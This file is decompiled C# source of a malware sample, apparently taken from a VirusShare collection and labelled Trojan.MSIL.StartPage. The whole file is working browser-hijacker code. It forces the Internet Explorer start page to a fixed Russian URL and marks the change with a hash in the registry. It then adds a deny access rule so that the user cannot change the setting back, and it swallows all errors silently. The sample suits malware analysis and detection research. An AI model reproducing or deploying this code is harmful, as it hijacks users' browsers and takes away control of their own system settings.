// Decompiled with JetBrains decompiler
// Type: WindowsApplication8.Program
// Assembly: WindowsApplication8, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 469C848C-418D-459A-9400-89FBAFE994A7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.StartPage.bo-4d9556a4c06ffcbfe10ec3b2d60192074b05bec0afffd6d24eb4b6f24a0cc08e.exe

using Microsoft.Win32;
using System;
using System.Security.AccessControl;
using System.Windows.Forms;

namespace WindowsApplication8
{
  internal class Program
  {
    public static string RegistryPath = "Software\\Microsoft\\Internet Explorer\\Main";
    public static string CheckPath = "Software\\Microsoft\\Internet Explorer\\Security\\Exploit";
    public static string Runonce1 = "RunOnceHasShown";
    public static string Runonce2 = "RunOnceComplete";
    public static string Complete = "MSIESTP";
    public static string Startpage = "Start Page";
    public static string Startpagevalue = "http://shkola.edu.ru/";
    public static int data = 1;

    [STAThread]
    private static void Main()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      if (new Program.RegistryChecker().start() != 1)
        return;
      new Program.RegistryEditor().start();
    }

    public class RegistryEditor
    {
      public void start()
      {
        string identity = Environment.UserDomainName + "\\" + Environment.UserName;
        try
        {
          RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(Program.RegistryPath, true);
          RegistrySecurity accessControl = registryKey1.GetAccessControl();
          RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Program.CheckPath, true);
          registryKey1.SetValue(Program.Runonce1, (object) Program.data);
          registryKey1.SetValue(Program.Runonce2, (object) Program.data);
          registryKey1.SetValue(Program.Startpage, (object) Program.Startpagevalue);
          int hashCode = (Program.data.ToString() + Program.data.ToString() + Program.Startpagevalue).GetHashCode();
          registryKey2.SetValue(Program.Complete, (object) hashCode);
          accessControl.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.SetValue, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
          registryKey1.SetAccessControl(accessControl);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public class RegistryChecker
    {
      public int start()
      {
        try
        {
          string str = Environment.UserDomainName + "\\" + Environment.UserName;
          RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(Program.CheckPath, true);
          RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Program.RegistryPath, false);
          return (int) registryKey1.GetValue(Program.Complete, (object) 0) != (registryKey2.GetValue(Program.Runonce1, (object) 0).ToString() + registryKey2.GetValue(Program.Runonce2, (object) 0).ToString() + registryKey2.GetValue(Program.Startpage, (object) 0).ToString()).GetHashCode() ? 1 : 0;
        }
        catch (Exception ex)
        {
          Registry.CurrentUser.CreateSubKey(Program.CheckPath);
          return 1;
        }
      }
    }
  }
}
